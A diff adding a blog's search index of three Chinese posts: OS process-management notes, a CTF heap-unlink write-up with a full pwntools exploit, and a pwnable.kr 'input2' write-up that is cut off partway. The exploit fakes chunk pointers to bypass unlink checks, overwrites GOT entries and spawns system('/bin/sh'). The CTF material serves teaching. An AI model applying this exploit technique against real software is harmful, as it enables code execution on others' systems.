@@ -1,0 +1,725 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>mos-进程管理</title>
+    <url>/2018/12/03/mos/</url>
+    <content><![CDATA[<h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><h3 id="进程的状态"><a href="#进程的状态" class="headerlink" title="进程的状态"></a>进程的状态</h3><ol>
+<li>运行态（占用CPU）</li>
+<li>就绪态（等待调度程序调度）</li>
+<li>阻塞态（等待阻塞原因解决）<a id="more"></a>
+
+</li>
+</ol>
+<h3 id="进程表"><a href="#进程表" class="headerlink" title="进程表"></a>进程表</h3><p>寄存器、程序计数器、程序状态字、堆栈指针、进程状态、优先级、调度参数、进程ID、父进程、进程组、信号、进程开始时间、使用的CPU时间、子进程的CPU时间、下次报警时间</p>
+<h3 id="维持顺序进程"><a href="#维持顺序进程" class="headerlink" title="维持顺序进程"></a>维持顺序进程</h3><ol>
+<li>中断产生</li>
+<li>中断硬件将程序计数器、程序状态字、寄存器等压入堆栈</li>
+<li>中断硬件从中断向量处装入新的程序计数器</li>
+<li>汇编语言过程保存寄存器、设置新的堆栈，并删除中断硬件保存的信息</li>
+<li>运行中断处理程序</li>
+<li>调度程序</li>
+<li>汇编语言过程设置寄存器，内存映射，启动被调度的程序</li>
+</ol>
+<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><h3 id="与进程的区别"><a href="#与进程的区别" class="headerlink" title="与进程的区别"></a>与进程的区别</h3><ol>
+<li>同一个进程下面的线程分享同一个地址空间，是一种轻量级进程</li>
+<li>进程拥有一个执行的线程，线程包含程序计数器、寄存器、堆栈</li>
+<li>进程用于把资源集中到一起，线程是在CPU上被调度的实体</li>
+</ol>
+<h3 id="服务器的三种模型"><a href="#服务器的三种模型" class="headerlink" title="服务器的三种模型"></a>服务器的三种模型</h3><ol>
+<li>多线程：并行性、阻塞系统调用</li>
+<li>单线程进程：无并行性、阻塞系统调用</li>
+<li>有限状态机：并行性、非阻塞系统调用、中断</li>
+</ol>
+<h3 id="多线程的实现"><a href="#多线程的实现" class="headerlink" title="多线程的实现"></a>多线程的实现</h3><ol>
+<li><p>在用户空间实现：</p>
+<p>线程表保存在用户空间、由运行时系统管理</p>
+<p>优点：不需要操作系统支持、比陷入内核快得多、允许自定义调度算法</p>
+<p>缺点：</p>
+<ol>
+<li><p>需要实现单个线程进行系统调用而不阻塞进程里的其他线程</p>
+<p>目前的解决方案是使用某个系统调用（例如select）通知预期的系统的系统调用（例如read）是否会阻塞，根据情况判断是否进行该系统调用</p>
+</li>
+<li><p>页面故障（页错误）导致内核阻塞整个进程</p>
+</li>
+<li><p>缺乏强硬机制挂起某个正在运行而耗光资源线程</p>
+</li>
+</ol>
+</li>
+<li><p>在内核中实现：</p>
+<p>线程表保存在内核中，创建删除均需要系统调用</p>
+<p>优点：阻塞线程的系统调用发生后，调度程序能够作用</p>
+<p>缺点：创建删除线程开销大，目前的解决方案是使用线程池</p>
+</li>
+<li><p>混合实现：</p>
+<p>内核调度内核级线程，内核级线程被多个用户级线程多路复用</p>
+<p>调度程序的激活机制（模拟内核线程的功能）：</p>
+<p>违反了n层不能调用n+1层的规定</p>
+<ol>
+<li>内核发现某内核级线程阻塞，通知该线程的运行时系统，这个机制称为上行调用</li>
+<li>运行时系统重新调度线程：阻塞当前线程，从就绪表取出另一个线程，设置寄存器后再启动</li>
+<li>内核发现线程可重新运行，又一次上行调用，运行时系统自行处理该信号</li>
+</ol>
+</li>
+</ol>
+<h2 id="进程间通信"><a href="#进程间通信" class="headerlink" title="进程间通信"></a>进程间通信</h2><h3 id="互斥实现"><a href="#互斥实现" class="headerlink" title="互斥实现"></a>互斥实现</h3><ol>
+<li><p>屏蔽中断（单核适用）</p>
+</li>
+<li><p>锁变量</p>
+</li>
+<li><p>严格轮换法</p>
+<p>临界区外的进程可能阻塞要进入临界区的进程</p>
+</li>
+<li><p>Peterson算法（忙等待）</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> False 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> True 1</span></span><br><span class="line"><span class="keyword">int</span> <span class="built_in">turn</span>;</span><br><span class="line"><span class="keyword">int</span> interested[<span class="number">2</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">enter_critical_region</span><span class="params">(<span class="keyword">int</span> <span class="built_in">process</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> other = <span class="number">1</span> - <span class="built_in">process</span>;</span><br><span class="line">    interested[<span class="built_in">process</span>] = True;</span><br><span class="line">    <span class="built_in">turn</span> = <span class="built_in">process</span>;</span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">turn</span> == <span class="built_in">process</span> &amp;&amp; interested[other] == True);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">leave_critical_region</span><span class="params">(<span class="keyword">int</span> <span class="built_in">process</span>)</span></span>&#123;</span><br><span class="line">    interested[<span class="built_in">process</span>] = False;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>TSL指令（忙等待）</p>
+<p><code>TSL RX, LOCK</code></p>
+<p>当LOCK变量为0，任何进程都能用TSL将其设置为1，并锁住内存总线，读写操作完成后，进程使用MOVE指令将LOCK的值重新设置为0</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">enter_critical_region:</span><br><span class="line">	TSL REGISTER, LOCK</span><br><span class="line">	CMP REGISTER, 0</span><br><span class="line">	JNE enter_critical_region</span><br><span class="line">	RET</span><br><span class="line">leave_critical_region:</span><br><span class="line">	MOVE LOCK, 0</span><br><span class="line">	RET</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>XCHG指令（忙等待）</p>
+<p>原子性交换指令</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">enter_critical_region:</span><br><span class="line">	MOVE REGISTER, 1</span><br><span class="line">	XCHG REGISTER, LOCK</span><br><span class="line">	CMP REGISTER, 0</span><br><span class="line">	JNE enter_critical_region</span><br><span class="line">	RET</span><br><span class="line">leave_critical_region:</span><br><span class="line">	MOVE LOCK, 0</span><br><span class="line">	RET</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ol>
+<h3 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h3><p>两种作用：互斥、同步</p>
+<p>设置变量的两种操作down和up，作为系统调用实现，操作时屏蔽中断，通过TSL或XCHG保证同一时刻只有一个CPU操作信号量（测试或更新信号量或使某进程睡眠时间很短）。</p>
+<p>down：进程检查信号量是否大于0，如果大于0，则将其值减1，并且继续运行；否则，因为信号量尚未减1，down操作并未完成，进程睡眠。检查、修改、睡眠均为原子操作</p>
+<p>up：信号量加1，由操作系统决定完成一个睡眠进程的down操作，即唤醒该进程，而信号量总体值不变</p>
+<p>初始值为1的信号量称作二元信号量，保证同时只有一个进程可以进入临界区，每个进程进入临界区之前执行一个down操作，刚刚退出时执行一个up操作，实现互斥。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N 100</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> semaphore;<span class="comment">//信号量</span></span><br><span class="line">semaphore mutex = <span class="number">1</span>;</span><br><span class="line">semaphore empty = N;</span><br><span class="line">semaphore full = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">producer</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> item;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        item = produce_item();</span><br><span class="line">        down(&amp;empty);<span class="comment">//空槽减1</span></span><br><span class="line">        down(&amp;mutex);<span class="comment">//进入临界区</span></span><br><span class="line">        insert_item(item);</span><br><span class="line">        up(&amp;mutex);<span class="comment">//离开临界区</span></span><br><span class="line">        up(&amp;full);<span class="comment">//满槽加1</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">consumer</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> item;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        down(&amp;full);<span class="comment">//满槽减1</span></span><br><span class="line">        down(&amp;mutex);<span class="comment">//进入临界区</span></span><br><span class="line">        item = remove_item();</span><br><span class="line">        up(&amp;mutex);<span class="comment">//离开临界区</span></span><br><span class="line">        up(&amp;empty);<span class="comment">//空槽加1</span></span><br><span class="line">        consumer_item(item);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>信号量mutex用来实现<strong>互斥</strong>，保证两个进程不会同时读写数据；信号量full和empty用来实现<strong>同步</strong>，保证某种事件的顺利进行，发生或不发生，这里保证缓冲区满时生成者停止运行（empty）和缓冲区 空时消费者停止运行（full）</p>
+<h3 id="互斥量"><a href="#互斥量" class="headerlink" title="互斥量"></a>互斥量</h3><p>简化的信号量，是一种加强的二元信号量，必须是同一个进程加锁解锁，通过类似yield的调用主动放弃CPU，避免忙等待，等待线程下次运行时，重新测试锁的状态</p>
+<h3 id="管程"><a href="#管程" class="headerlink" title="管程"></a>管程</h3><p>一个由过程、变量、数据结构组成的一个集合，进程可以调用管程的过程，但不能在管程之外的过程访问管程的数据结构，并且任一时刻管程中只能有一个活跃进程。</p>
+<h3 id="屏障"><a href="#屏障" class="headerlink" title="屏障"></a>屏障</h3><p>当一个进程到达屏障时，他就被屏障拦截，直到所有进程都达到该屏障为止</p>
+<h2 id="调度"><a href="#调度" class="headerlink" title="调度"></a>调度</h2><p>需要调度的情形：</p>
+<ol>
+<li>创建一个新进程之后</li>
+<li>一个进程退出之后</li>
+<li>进程阻塞</li>
+<li>硬件中断</li>
+</ol>
+<p>调度算法的目标；</p>
+<ol>
+<li>公平，给每个进程公平的CPU份额</li>
+<li>策略强制执行，保证所宣布的策略执行</li>
+<li>平衡，保持系统的所有部分繁忙</li>
+<li>（批处理系统）吞吐量，每小时的最大作业数</li>
+<li>（批处理系统）周转时间，从提交到终止间的最小时间</li>
+<li>（批处理系统）CPU利用率，保持CPU始终忙碌</li>
+<li>（交互系统）响应时间，快速响应请求</li>
+<li>（交互系统）均衡性，满足用户期望</li>
+<li>（实时系统）满足截止时间，避免丢失数据</li>
+<li>（实时系统）可预测性，在多媒体系统中避免品质降低</li>
+</ol>
+<h3 id="批处理系统"><a href="#批处理系统" class="headerlink" title="批处理系统"></a>批处理系统</h3><ol>
+<li>先来先服务（非抢占）</li>
+<li>最短作业优先（非抢占）</li>
+<li>最短剩余时间优先（抢占）</li>
+</ol>
+<h3 id="交互式系统"><a href="#交互式系统" class="headerlink" title="交互式系统"></a>交互式系统</h3><ol>
+<li><p>轮转调度</p>
+<p>依赖时间片管理进程运行时间，时间片设置太短会导致过多的进程切换，降低了CPU的效率，设置太长会又可能引起对短的交互请求的响应时间变长</p>
+</li>
+<li><p>优先级调度</p>
+<p>为了避免高优先级进程无休止的运行，可以利用最大时间片机制，当进程的时间片用完，下一个次高优先级的进程获得机会运行  </p>
+<p>优先级可以静态或动态赋予，IO密集型进程应该赋予较高的优先级，同时运行较短的时间，CPU密集型相反</p>
+</li>
+<li><p>多级队列</p>
+<p>设立优先级类，属于最高优先级类的进程运行一个时间片，属于次高级类的进程运行两个时间片，再次一级运行四个时间片，以此类推，当一个进程的时间片用完后，被移到下一类</p>
+</li>
+<li><p>最短进程优先</p>
+<p>通过首先运行最短的作业来使响应时间最短，假设某进程的估计运行时间为$$T_0$$ ，下一次测量的运行时间为$$T_1$$，可以用两个值的加权和来改进估计时间，即$$aT_0+(1-a)T_1$$，通过选择$$a$$的值，可以决定是尽快忘掉老的运行时间，还是在一段长的时间内记住他们</p>
+</li>
+<li><p>保证调度</p>
+<p>保证每个进程获得的CPU时间相等，系统必须跟踪每个进程自从创建以来的CPU运行时间</p>
+</li>
+<li><p>彩票调度</p>
+<p>给进程分发彩票，给更重要的进程分发额外的彩票，CPU调度通过抽奖的方式选择进程，进程之间可以交换彩票</p>
+</li>
+<li><p>公平分享调度</p>
+<p>考虑进程的拥有者，给拥有者分配公平的资源份额</p>
+</li>
+</ol>
+<h3 id="实时系统"><a href="#实时系统" class="headerlink" title="实时系统"></a>实时系统</h3><p>调度系统的任务就是满足所有进程的截止时间</p>
+<h3 id="策略与机制"><a href="#策略与机制" class="headerlink" title="策略与机制"></a>策略与机制</h3><p>为了解决主进程对子进程的调度控制问题，将调度机制与调度策略分离，即将调度算法以某种形式参数化，由用户进程填写该参数。调度机制位于内核，调度策略由用户进程决定</p>
+<h3 id="线程调度"><a href="#线程调度" class="headerlink" title="线程调度"></a>线程调度</h3><p>用户级线程：调度程序决定进程运行顺序，运行时系统决定线程运行顺序，缺少时钟强制挂起运行时间过长的线程</p>
+<p>内核级线程：像调度进程一样调度线程，比用户级线程效率低的多，需要完整的上下文切换，修改内存映像，使高速缓存失效，带来的好处是，线程阻塞没必要挂起整个进程</p>
+]]></content>
+      <tags>
+        <tag>linux</tag>
+        <tag>os</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>heap unlink</title>
+    <url>/2018/08/06/unlink/</url>
+    <content><![CDATA[<p><a href="https://github.com/void0red/code/blob/master/task/2018_07_30/first" target="_blank" rel="noopener">bin</a>地址</p>
+<h2 id="0x00问题所在"><a href="#0x00问题所在" class="headerlink" title="0x00问题所在"></a>0x00问题所在</h2><ol>
+<li>free后的堆指针没用置空</li>
+<li>free没有对flag进行判断是否已经free过了</li>
+</ol>
+<h2 id="0x01unlink"><a href="#0x01unlink" class="headerlink" title="0x01unlink"></a>0x01unlink</h2><ul>
+<li><p>发生在free一个chunk，发现相邻的chunk处于free状态，从bin双链表取出来的时候，合并至少两个free chunk。前一个chunk的状态通过<code>p-&gt;presize</code>的最低位来判断，后一个chunk的状态通过<code>(p+p-&gt;size+(p+size)-&gt;size)-&gt;presize</code>的最低位来判断。</p>
+<a id="more"></a></li>
+<li><p>unlink的检查：</p>
+<ul>
+<li><p><code>p-&gt;fd-&gt;bk == p &amp;&amp; p-&gt;bk-&gt;fd == p</code> </p>
+<p>绕过：寻找<code>*ptr == p</code></p>
+</li>
+<li><p><code>((p+p-&gt;size)-&gt;presize)&amp;0x1 == 0 &amp;&amp; ((p+p-&gt;size)-&gt;preseize) == p-&gt;size</code></p>
+<p>绕过：覆盖nextchunk的presize</p>
+</li>
+</ul>
+</li>
+<li><p>unlink</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义:</span></span><br><span class="line">FD = p-&gt;fd;</span><br><span class="line">BK = p-&gt;bk;</span><br><span class="line">FD-&gt;bk = BK;</span><br><span class="line">BK-&gt;fd = FD;</span><br><span class="line"><span class="comment">//方法：</span></span><br><span class="line">p-&gt;fd = ptr<span class="number">-0x8</span>*<span class="number">3</span>;</span><br><span class="line">p-&gt;bk = ptr<span class="number">-0x8</span>*<span class="number">2</span>;</span><br><span class="line"><span class="comment">//效果：</span></span><br><span class="line">*ptr = p-&gt;fd;</span><br><span class="line"><span class="comment">//*ptr = ptr-0x8*3</span></span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<h2 id="0x02分析"><a href="#0x02分析" class="headerlink" title="0x02分析"></a>0x02分析</h2><ul>
+<li><p>堆指针依次保存在<code>0x6020e0</code> 中，记为<code>list</code></p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">int</span> <span class="built_in">list</span>;</span><br><span class="line"><span class="built_in">list</span>[i*<span class="number">2</span>] = chunkp;</span><br><span class="line"><span class="built_in">list</span>[i*<span class="number">2</span>+<span class="number">1</span>] = flag;</span><br></pre></td></tr></table></figure>
+
+
+</li>
+</ul>
+<ul>
+<li><p>利用<code>unlink</code>篡改堆指针，因为构造一次<code>unlink</code>只能修改<code>ptr</code>处的值，而且<code>ptr</code>必需保存<code>unlink</code>对象堆的指针，所以尽量把他修改为保存堆指针<code>list</code>中的某处地址，然后伪造list中的数据，再利用edit，修改list中伪造地址的数据</p>
+</li>
+<li><p>构造<code>unlink</code>的<code>fd, bk</code>，要使<code>ptr-0x8*3</code>落在<code>list</code>地址的范围，同时<code>ptr</code>还要保存<code>unlink</code>对象堆地址，也就是list[i*2]，取<code>ptr == list+0x18+0x8 == list[4]</code>，即<code>unlink(chunk2)</code>，配合<code>unlink</code>还需要一个相邻的堆，所以考虑先获得两个堆的指针。</p>
+</li>
+</ul>
+<h2 id="0x03利用"><a href="#0x03利用" class="headerlink" title="0x03利用"></a>0x03利用</h2><ul>
+<li><p>首先申请两个0x100的堆再释放，目的是保存两个堆的指针，接着申请0x100*2+0x10(chunk header size)的堆，这个堆应该填充在先前释放的两个堆的位置。</p>
+<p><img src="/images/unlink0.png" alt=""></p>
+</li>
+<li><p>然后free后面一个实际上不存在，但是有个残留指针的堆，触发前一个堆的<code>unlink</code>， 导致<code>*ptr == list[4]</code>修改为<code>ptr-0x8*3 == list+0x18+0x8-0x8*3 == list[1]</code>即chunk1的flag处。</p>
+</li>
+<li><p>利用edit(chunk2)修改<code>list</code>的数据，从chunk1的flag处开始，修改<code>list[2] = free@got; list[4] = read@got</code></p>
+</li>
+<li><p>利用edit(chunk1)修改<code>free</code>函数地址为<code>puts</code>函数地址，然后free(chunk2)就会打印<code>read</code>函数的地址</p>
+</li>
+<li><p>利用动态链接库计算<code>system</code>函数的地址，并用edit(chunk1)修改<code>free(puts)</code>函数地址为<code>puts</code>函数地址</p>
+</li>
+<li><p>任意申请一个堆存入<code>/bin/sh\x00</code>，调用free即触发<code>system</code></p>
+</li>
+</ul>
+<h2 id="0x04code"><a href="#0x04code" class="headerlink" title="0x04code"></a>0x04code</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># use to save two pointers in list, not fastbin</span></span><br><span class="line">create(<span class="number">2</span>, <span class="number">0x100</span>, <span class="string">'a'</span>)</span><br><span class="line">create(<span class="number">1</span>, <span class="number">0x100</span>, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">list_addr = <span class="number">0x6020e0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p_addr also set to list[4](save index2's pointer)</span></span><br><span class="line">p_addr = list_addr + <span class="number">0x18</span> + <span class="number">0x8</span></span><br><span class="line"><span class="comment"># size = 0x100+0x100+0x10(chunk1 header)</span></span><br><span class="line"><span class="comment"># fake data(low addr --&gt; high addr): chunk0p-&gt;(presize, size&amp;inuse, fd, bk, data), chunk1p-&gt;(presize, size&amp;inuse)</span></span><br><span class="line"><span class="comment"># keep: [1]p-&gt;fd-&gt;bk == p-&gt;bk-&gt;fd == p, [2]p-&gt;size == (p+size)-&gt;presize</span></span><br><span class="line">create(<span class="number">2</span>, <span class="number">0x210</span>, p64(<span class="number">0</span>)+p64(<span class="number">0x101</span>)+p64(p_addr<span class="number">-0x18</span>)+p64(p_addr<span class="number">-0x10</span>)+<span class="string">'a'</span>*(<span class="number">0x100</span><span class="number">-0x20</span>)+p64(<span class="number">0x100</span>)+p64(<span class="number">0x210</span><span class="number">-0x100</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># when free chunk1, inuse bit is `0`, than unlink chunk0, p-&gt;fd-&gt;bk = p-&gt;bk, p-&gt;bk-&gt;fd = p-&gt;fd</span></span><br><span class="line"><span class="comment"># *p_addr = p-&gt;fd = p_addr-0x18 = list_addr+0x8</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># fake data: index0_flag, index1p, index1_flag, index2p, index2_flag</span></span><br><span class="line">edit(<span class="number">2</span>, p64(<span class="number">0</span>)+p64(elf.got[<span class="string">'free'</span>])+p64(<span class="number">1</span>)+p64(elf.got[<span class="string">'read'</span>])+p64(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># change free to puts</span></span><br><span class="line">edit(<span class="number">1</span>, p64(elf.symbols[<span class="string">'puts'</span>]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># puts(&amp;list[4]) == puts(free@got)</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">read_addr = u64(p.recv(<span class="number">6</span>) + <span class="string">'\x00'</span>*<span class="number">2</span>)</span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>] - libc.symbols[<span class="string">'read'</span>] + read_addr</span><br><span class="line"></span><br><span class="line"><span class="comment"># change puts to system</span></span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line">create(<span class="number">3</span>, <span class="number">0x20</span>, <span class="string">'/bin/sh'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># system('/bin/sh')</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>writeUp for input2</title>
+    <url>/2018/03/17/input2/</url>
+    <content><![CDATA[<blockquote>
+<p><a href="http://pwnable.kr" target="_blank" rel="noopener">pwnable</a></p>
+<p><code>ssh input2@pwnable.kr -p 2222</code> (password: <code>guest</code>)</p>
+</blockquote>
+<a id="more"></a>
+<p>po上源码</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[], <span class="keyword">char</span>* envp[])</span></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Welcome to pwnable.kr\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Let's see if you know how to give input to program\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Just give me correct inputs then you will get the flag :)\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// argv</span></span><br><span class="line">    <span class="keyword">if</span>(argc != <span class="number">100</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'A'</span>],<span class="string">"\x00"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv[<span class="string">'B'</span>],<span class="string">"\x20\x0a\x0d"</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 1 clear!\n"</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// stdio</span></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">4</span>];</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x00\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x0a\x02\xff"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 2 clear!\n"</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// env</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">"\xca\xfe\xba\xbe"</span>, getenv(<span class="string">"\xde\xad\xbe\xef"</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 3 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// file</span></span><br><span class="line">    FILE* fp = fopen(<span class="string">"\x0a"</span>, <span class="string">"r"</span>);</span><br><span class="line">    <span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( fread(buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>( <span class="built_in">memcmp</span>(buf, <span class="string">"\x00\x00\x00\x00"</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 4 clear!\n"</span>); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// network</span></span><br><span class="line">    <span class="keyword">int</span> sd, cd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">    sd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"socket error, tell admin\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    saddr.sin_family = AF_INET;</span><br><span class="line">    saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    saddr.sin_port = htons( atoi(argv[<span class="string">'C'</span>]) );</span><br><span class="line">    <span class="keyword">if</span>(bind(sd, (struct sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"bind error, use another port\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">listen</span>(sd, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> c = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">    cd = accept(sd, (struct sockaddr *)&amp;caddr, (<span class="keyword">socklen_t</span>*)&amp;c);</span><br><span class="line">    <span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"accept error, tell admin\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>( recv(cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">"\xde\xad\xbe\xef"</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Stage 5 clear!\n"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// here's your flag</span></span><br><span class="line">    system(<span class="string">"/bin/cat flag"</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这条题目主要是用来练习Linux编程的几个常见函数</p>
+<ul>
+<li>execv()</li>
+<li>fork()</li>
+<li>pipe()</li>
+<li>dup2()</li>
+<li>socket编程</li>
+</ul>
+<ol>
+<li><p>argv</p>
+<p>argc用来保持程序运行时的参数数目（包括程序完整路径），argv用来具体保存参数（argv[0]是程序运行路径），envp用来具体保存程序运行时的环境变量。</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> *argv[<span class="number">101</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">101</span>; i++)argv[i] = <span class="string">"a"</span>; </span><br><span class="line">argv[<span class="number">0</span>] = <span class="string">"/home/input2/input"</span>;</span><br><span class="line">argv[<span class="string">'A'</span>] = <span class="string">"\x00"</span>;</span><br><span class="line">argv[<span class="string">'B'</span>] = <span class="string">"\x20\x0a\x0d"</span>;</span><br><span class="line">argv[<span class="number">100</span>] = <span class="literal">NULL</span>;</span><br><span class="line">argv[<span class="string">'C'</span>] = <span class="string">"2333"</span><span class="comment">//端口</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>stdio</p>
+<p>可见程序比较了标准输入流（0），标准错误流（2）中的各四个字节，可以考虑用管道重定向这两个流，利用fork()函数产生子进程，子进程将字节写入管道，父进程从管道重定向到标准流中。</p>
+<p><img src="/images/20170509162502566.png" alt=""></p>
